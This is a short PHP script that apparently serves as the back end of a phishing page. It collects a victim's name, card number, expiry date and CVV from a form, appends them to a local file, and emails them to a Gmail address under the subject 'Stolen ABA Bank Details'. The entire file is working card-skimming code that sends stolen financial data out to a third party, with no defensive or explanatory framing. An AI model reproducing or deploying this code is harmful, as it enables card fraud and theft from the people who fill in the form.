<?php
    $name = $_POST['name'];
    $cardnumber = $_POST['cardnumber'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];

    $data = "$name | $cardnumber | $expiry | $cvv\n";

    // Save to file
    file_put_contents('bank_details.txt', $data, FILE_APPEND);

    // Email the data
    $to = "gqwgqgq5q5@gmail.com";
    $subject = "Stolen ABA Bank Details";
    $message = "Name: $name\nCard Number: $cardnumber\nExpiry Date: $expiry\nCVV: $cvv";
    $headers = "From: menglihour009@gmail.com>";

    mail($to, $subject, $message, $headers);
?>
